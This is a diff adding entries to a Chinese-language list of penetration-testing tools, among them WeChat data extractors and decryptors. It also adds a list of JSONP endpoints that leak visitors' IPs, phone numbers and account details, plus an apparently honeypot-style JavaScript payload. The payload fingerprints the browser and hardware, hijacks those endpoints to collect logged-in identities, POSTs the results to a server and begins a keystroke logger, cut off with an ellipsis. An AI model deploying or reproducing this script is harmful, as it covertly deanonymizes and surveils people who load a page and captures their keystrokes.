@@ -44,6 +44,24 @@
 
     > MailSniper是一种渗透测试工具，用于在Microsoft Exchange环境中的电子邮件中搜索特定术语（密码，内部情报，网络体系结构信息等）。 它可以用作非管理用户来搜索自己的电子邮件，也可以用作管理员来搜索域中每个用户的邮箱。
 
+- [wechat_info_collect](https://github.com/ecat-sec/wechat_info_collect)
+
+    >  针对微信客户端的信息收集工具, 一键提取本地PC所有的微信信息, 包括微信号, 手机号等
+
+- [WXDBDecrypt.NET](https://github.com/Mr0x01/WXDBDecrypt.NET)
+
+    > 微信PC版数据库解密工具 .NET版本
+
+- [AWS-Threat-Simulation-and-Detection](https://github.com/sbasu7241/AWS-Threat-Simulation-and-Detection)
+
+    > 与Stratus Red团队检测AWS威胁
+
+- [fsociety](https://github.com/fsociety-team/fsociety)
+
+    > 模块化渗透测试框架
+- [Gin and Juice Shop](https://portswigger.net/blog/gin-and-juice-shop-put-your-scanner-to-the-test)
+    > Burp Suite中的go扫描器
+
 
 
 **渗透工具**
@@ -100,6 +118,10 @@
 
     > Swagger REST API 信息泄露利用工具
 
+- [swagger-ui vulnerabilities](https://snyk.io/vuln/npm%3Aswagger-ui)
+
+    > Swagger-ui 包中的已知漏洞。这不包括属于此包的依赖项的漏洞。自动发现并修复影响您的项目的漏洞。
+
 - [FastTunnel](https://github.com/SpringHgui/FastTunnel)
 
     > NAT 内网穿透 远程内网计算机 域名访问内网站点 反向代理内网服务 花生壳 端口转发 http代理 微信 小程序
@@ -147,6 +169,10 @@
 - [brute shark](https://github.com/odedshimon/BruteShark)
 
 > BruteShark是一种网络取证分析工具（NFAT），增强型网络分析工具
+
+- [mitmproxy2swagger](https://github.com/alufers/mitmproxy2swagger)
+  >一个自动转换mitmproxy捕获到OpenAPI 3.0规范的工具。这意味着您可以通过运行应用程序并捕获流量来自动反向工程REST api。
+
 
 **CVE-EXP**
 
@@ -296,6 +322,398 @@
 
     >  在应对安全事件上机排查时，对于没有此方面经验但是有研判能力的安全专家来讲，经常苦于需要参考各种安全手册进行痕迹采集、整理、研判，此时我们可以使用FireKylin-Agent进行一键痕迹收集，降低排查安全专家收集工作的难度。
 
+- [RedGuard](https://github.com/wikiZ/RedGuard)
+    > C2流量检测拦截工具
+
+## 信息收集
+
+```
+http://burp/favicon.ico
+https://openfpcdn.io/fingerprintjs/v3
+https://verify.cmpassport.com/h5/httpsPreGetmobile
+https://www.taobao.com/help/getip.php?callback=ipCallback
+https://www.yy.com/yyweb/user/queryUserInfo.json?callback=jsonp
+https://www.cmpassport.com/h5/onekeylogin/getNewUnicomPhonescrip
+https://www.cmpassport.com/h5/onekeylogin/getNewTelecomPhonescrip
+https://tieba.baidu.com/tbmall/gettdouiconinfo?callback=jsonp1613919078534
+https://yuedu.baidu.com/nauser/getyduserinfo?na_uncheck=1&opid=wk_na&callback=bd
+https://widget.weibo.com/public/aj_relationship.php?fuid=2991975565&callback=STK_16073033003861
+https://v2.sohu.com/api/pc-home-city/home-data/ip2location?_=1606458878259&callback=jQuery1124018281896477578718_1606458878259
+https://id6.me/auth/preauth.do?paramKey=10F72757C5A5A12B0A6DA61E62BDF3238163CC31B9CC3CC506CCD6BF67D3BC8CEEC92DAF1ED125BC4F681D118A2ED62D8CD18EE0629220BD69802469FAB4E1C62067CA310EDC5E1A2DCDCF0E8202AA852D611A0B78364344F15A866395C9AAF3C1061C9F6B1ACDCAB232960AC6F14D615ED5184184BDB125AC647A8422EC25D7&clientType=2&paramStr=39826A2D6BADA0327947D80463C1422C01D472F90ECC1B7FC72D262D1C7AC4FC201506C46971655C6C67C5714F232A532126204E40DD35C24C4264AC5D106D9EBEFEBB98157CB7230F5F8BF1788608CA3CF9F38998815804A4652BF20C1EB763525257296155BAF2B4B46836ED276DE6944344B4135D94555640885B4363C4AD&appId=8013416909&format=jsonp&sign=C733AA0C9B2F41175F94344CAF0AA227C2F2B199&version=1.5&
+https://opencloud.wostore.cn/openapi/netauth/precheck/wp?timeStamp=1659325750804&packname=xxx&business_type=1&format=jsonp&sign=FCE6F4692C5FEDD8993FDEBD079EBF49&callback=getNewUnicomPhone&fp=&client_type=7&version=v4.5&client_id=99166000000000000228&key=c4ZMLe9%2F1iX9Do2h4FGMqy5vC0IzZ%2Fgj9LePAFU%2BwTSc%2BHUbB6W1arA9YDRqR7HjFok226YHwwJrLq06Da%2BBMBM%2FPV7%2FexfV3uV%2BbR0xzMz4Xy%2F1pKyIriuaXA%2BieaQeYtvjXs1gTYXWc%2F8vZb3TODk9cKywn9FOI7m3iqrJUko%3D&packsign=xxx&
+https://www.qidian.com/ajax/UserInfoFemale/GetUserInfo?areaid=6&appid=10&format=jsonp&method=autoLoginHandler&autoLoginHandler=&_=1607051376245&callback=autoLoginHandler
+https://www.qidian.com/ajax/UserInfoFemale/GetUserInfo?areaid=6&appid=10&format=jsonp&method=autoLoginHandler&autoLoginHandler=&_=1607051376245&callback=autoLoginHandler
+```
+
+绿盟JS代码
+```javascript
+<script>"use strict";
+
+function ajax(params) {
+  params = params || {};
+  params.data = params.data || {};
+  var json = params.jsonp ? jsonp(params) : json(params);
+
+  function jsonp(params) {
+    var callbackName = params.jsonp;
+    var head = document.getElementsByTagName('head')[0];
+    params.data['callback'] = callbackName;
+    var data = formatParams(params.data);
+    var script = document.createElement('script');
+    head.appendChild(script);
+
+    window[callbackName] = function (json) {
+      head.removeChild(script);
+      clearTimeout(script.timer);
+      window[callbackName] = null;
+      params.success && params.success(json);
+    };
+
+    script.src = params.url + '?' + data;
+
+    if (params.time) {
+      script.timer = setTimeout(function () {
+        window[callbackName] = null;
+        head.removeChild(script);
+        params.error && params.error({
+          message: 'long time'
+        });
+      }, time);
+    }
+  }
+
+  function formatParams(data) {
+    var arr = [];
+
+    for (var name in data) {
+      arr.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));
+    } // arr.push('v=' + random());
+
+
+    return arr.join('&');
+  }
+
+  function random() {
+    return Math.floor(Math.random() * 10000 + 500);
+  }
+}
+
+function BrowserType(url) {
+  var ua = navigator.userAgent.toLowerCase();
+
+  var testUa = function testUa(regexp) {
+    return regexp.test(ua);
+  };
+
+  var testVs = function testVs(regexp) {
+    return ua.match(regexp).toString().replace(/[^0-9|_.]/g, "").replace(/_/g, ".");
+  };
+
+  var system = "unknow";
+
+  if (testUa(/windows|win32|win64|wow32|wow64/g)) {
+    system = "windows";
+  } else if (testUa(/macintosh|macintel/g)) {
+    system = "macos";
+  } else if (testUa(/x11/g)) {
+    system = "linux";
+  } else if (testUa(/android|adr/g)) {
+    system = "android";
+  } else if (testUa(/ios|iphone|ipad|ipod|iwatch/g)) {
+    system = "ios";
+  }
+
+  var systemVs = "unknow";
+
+  if (system === "windows") {
+    if (testUa(/windows nt 5.0|windows 2000/g)) {
+      systemVs = "2000";
+    } else if (testUa(/windows nt 5.1|windows xp/g)) {
+      systemVs = "xp";
+    } else if (testUa(/windows nt 5.2|windows 2003/g)) {
+      systemVs = "2003";
+    } else if (testUa(/windows nt 6.0|windows vista/g)) {
+      systemVs = "vista";
+    } else if (testUa(/windows nt 6.1|windows 7/g)) {
+      systemVs = "7";
+    } else if (testUa(/windows nt 6.2|windows 8/g)) {
+      systemVs = "8";
+    } else if (testUa(/windows nt 6.3|windows 8.1/g)) {
+      systemVs = "8.1";
+    } else if (testUa(/windows nt 10.0|windows 10/g)) {
+      systemVs = "10";
+    }
+  } else if (system === "macos") {
+    //systemVs = testVs(/os x [\d._]+/g)
+  } else if (system === "android") {
+    //systemVs = testVs(/android [\d._]+/g)
+  } else if (system === "ios") {
+    //systemVs = testVs(/os [\d._]+/g)
+  }
+
+  var platform = "unknow";
+
+  if (system === "windows" || system === "macos" || system === "linux") {
+    platform = "desktop";
+  } else if (system === "android" || system === "ios" || testUa(/mobile/g)) {
+    platform = "mobile";
+  }
+
+  var engine = "unknow";
+  var supporter = "unknow";
+
+  if (testUa(/applewebkit/g)) {
+    engine = "webkit";
+
+    if (testUa(/edge/g)) {
+      supporter = "edge";
+    } else if (testUa(/opr/g)) {
+      supporter = "opera";
+    } else if (testUa(/chrome/g)) {
+      supporter = "chrome";
+    } else if (testUa(/safari/g)) {
+      supporter = "safari";
+    }
+  } else if (testUa(/gecko/g) && testUa(/firefox/g)) {
+    engine = "gecko";
+    supporter = "firefox";
+  } else if (testUa(/presto/g)) {
+    engine = "presto";
+    supporter = "opera";
+  } else if (testUa(/trident|compatible|msie/g)) {
+    engine = "trident";
+    supporter = "iexplore";
+  }
+
+  var engineVs = "unknow";
+
+  if (engine === "webkit") {
+    engineVs = testVs(/applewebkit\/[\d._]+/g);
+  } else if (engine === "gecko") {
+    engineVs = testVs(/gecko\/[\d._]+/g);
+  } else if (engine === "presto") {
+    engineVs = testVs(/presto\/[\d._]+/g);
+  } else if (engine === "trident") {
+    engineVs = testVs(/trident\/[\d._]+/g);
+  }
+
+  var supporterVs = "unknow";
+
+  if (supporter === "chrome") {
+    supporterVs = testVs(/chrome\/[\d._]+/g);
+  } else if (supporter === "safari") {
+    supporterVs = testVs(/version\/[\d._]+/g);
+  } else if (supporter === "firefox") {
+    supporterVs = testVs(/firefox\/[\d._]+/g);
+  } else if (supporter === "opera") {
+    supporterVs = testVs(/opr\/[\d._]+/g);
+  } else if (supporter === "iexplore") {
+    supporterVs = testVs(/(msie [\d._]+)|(rv:[\d._]+)/g);
+  } else if (supporter === "edge") {
+    supporterVs = testVs(/edge\/[\d._]+/g);
+  }
+
+  var shell = "none";
+  var shellVs = "unknow";
+
+  if (testUa(/micromessenger/g)) {
+    shell = "wechat";
+    shellVs = testVs(/micromessenger\/[\d._]+/g);
+  } else if (testUa(/qqbrowser/g)) {
+    shell = "qq";
+    shellVs = testVs(/qqbrowser\/[\d._]+/g);
+  } else if (testUa(/ucbrowser/g)) {
+    shell = "uc";
+    shellVs = testVs(/ucbrowser\/[\d._]+/g);
+  } else if (testUa(/qihu 360se/g)) {
+    shell = "360";
+  } else if (testUa(/2345explorer/g)) {
+    shell = "2345";
+    shellVs = testVs(/2345explorer\/[\d._]+/g);
+  } else if (testUa(/metasr/g)) {
+    shell = "sougou";
+  } else if (testUa(/lbbrowser/g)) {
+    shell = "liebao";
+  } else if (testUa(/maxthon/g)) {
+    shell = "maxthon";
+    shellVs = testVs(/maxthon\/[\d._]+/g);
+  }
+
+  var languages = navigator.languages || navigator.language || navigator.userLanguage;
+  var CPUInfo = navigator.platform;
+  var CPUNumber = navigator.hardwareConcurrency;
+  var canvas = document.createElement("canvas");
+  var gl = canvas.getContext("experimental-webgl");
+  var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+  var VideoCardSuppliers = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+  var GraphicsCardRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+  var ScreenWidth = window.screen.width;
+  var ScreenHeight = window.screen.height;
+  var ColorDepth = window.screen.colorDepth; // var NetType = navigator.connection.type;
+
+  var res = Object.assign({
+    engine: engine,
+    engineVs: engineVs,
+    platform: platform,
+    supporter: supporter,
+    supporterVs: supporterVs,
+    system: system,
+    systemVs: systemVs,
+    languages: languages,
+    CPUInfo: CPUInfo,
+    CPUNumber: CPUNumber,
+    VideoCardSuppliers: VideoCardSuppliers,
+    GraphicsCardRenderer: GraphicsCardRenderer,
+    ScreenWidth: ScreenWidth,
+    ScreenHeight: ScreenHeight,
+    ColorDepth: ColorDepth
+  }, shell === "none" ? {} : {
+    shell: shell,
+    shellVs: shellVs
+  });
+  // var formData = new FormData();
+  // formData.append('jInfo', window.btoa(unescape(encodeURIComponent(JSON.stringify(res))))); // bt
+
+  fetch(url, {
+    cache: "no-cache",
+    method: "POST",
+    body: window.btoa(unescape(encodeURIComponent(JSON.stringify(res))))
+  });
+}
+
+
+ajax({
+  url: 'https://www.taobao.com/help/getip.php',
+  jsonp: 'ipCallback',
+  data: {},
+  success: function success(res) {
+    localStorage.setItem('pub_ip', JSON.stringify(res));
+  },
+  error: function error(_error) {
+    console.log(_error);
+  }
+});
+
+ajax({
+  url: 'https://tieba.baidu.com/tbmall/gettdouiconinfo',
+  jsonp: 'jsonp1613919078534',
+  data: {},
+  success: function success(res) {
+    localStorage.setItem('baidu', JSON.stringify(res));
+  },
+  error: function error(_error) {
+    console.log(_error);
+  }
+});
+
+ajax({
+  url: 'https://www.qidian.com/ajax/UserInfoFemale/GetUserInfo',
+  jsonp: 'autoLoginHandler',
+  data: {'areaid': 6, 'appid': 10, 'format': 'jsonp', 'method': 'autoLoginHandler', 'autoLoginHandler': '', '_': '1607051376245'},
+  success: function success(res) {
+    localStorage.setItem('qidian', JSON.stringify(res));
+  },
+  error: function error(_error) {
+    console.log(_error);
+  }
+});
+
+ajax({
+  url: 'https://www.yy.com/yyweb/user/queryUserInfo.json',
+  jsonp: 'jsonp',
+  data: {},
+  success: function success(res) {
+    localStorage.setItem('yy', JSON.stringify(res));
+  },
+  error: function error(_error) {
+    console.log(_error);
+  }
+});
+
+ajax({
+  url: 'https://v2.sohu.com/api/pc-home-city/home-data/ip2location',
+  jsonp: 'jQuery1124018281896477578718_1606458878259',
+  data: {'_': '1606458878259'},
+  success: function success(res) {
+    localStorage.setItem('sohu_public_ip', JSON.stringify(res));
+  },
+  error: function error(_error) {
+    console.log(_error);
+  }
+});
+
+
+function send_data(types) {
+  var data = {};
+  data["public_ip"] = {};
+
+  try {
+    data["public_ip"]['taobao_public_ip'] = JSON.parse(localStorage.getItem('pub_ip'))['ip'];
+  } catch (e) {
+    data["public_ip"]['taobao_public_ip'] = "taobaoip获取接口可能已失效或者未设置，请尽快检查";
+  } finally {}
+  try {
+        data["public_ip"]["sohu_public_ip"] = JSON.parse(localStorage.getItem('sohu_public_ip'))["data"]["ip"];
+      } catch (e) {
+        data["public_ip"]['sohu_public_ip'] = "sohu_ip获取接口可能已失效或者未设置，请尽快检查";
+      } finally {}
+
+  types.forEach(function (item) {
+  if (item.endsWith("ip")){
+
+  }else{
+      data[item] = JSON.parse(localStorage.getItem(item));
+    }
+  });
+  // var jp = new FormData();
+  // jp.append("jInfo", window.btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
+  fetch('/other_data', {
+    method: 'POST',
+    cache: "no-cache",
+    body: window.btoa(unescape(encodeURIComponent(JSON.stringify(data))))
+  });
+}
+
+var logger = "";
+
+var keyDown = function keyDown(e) {
+  var e = e || event;
+  var currKey = e.keyCode || e.which || e.charCode;
+  var keyName = ""
+  if (currKey > 7 && currKey < 32 || currKey > 31 && currKey < 47) {
+    switch (currKey) {
+      case 8:
+        keyName = "[退格]";
+        break;
+
+      case 9:
+        keyName = "[制表]";
+        break;
+
+      case 13:
+        keyName = "[回车]";
+        break;
+      //case 16:keyName = "[shift]"; break;
+
+      case 17:
+        keyName = "[Ctrl]";
+        break;
+
+      case 18:
+        keyName = "[Alt]";
+        break;
+
+      case 20:
+        keyName = "[大小写]";
+        break;
+
+      case 32:
+        keyName = "[空格]";
+        break;
+
+      case 33:
+        keyName = "[PageUp]…</script>
+```
 
 
 # 代码审计
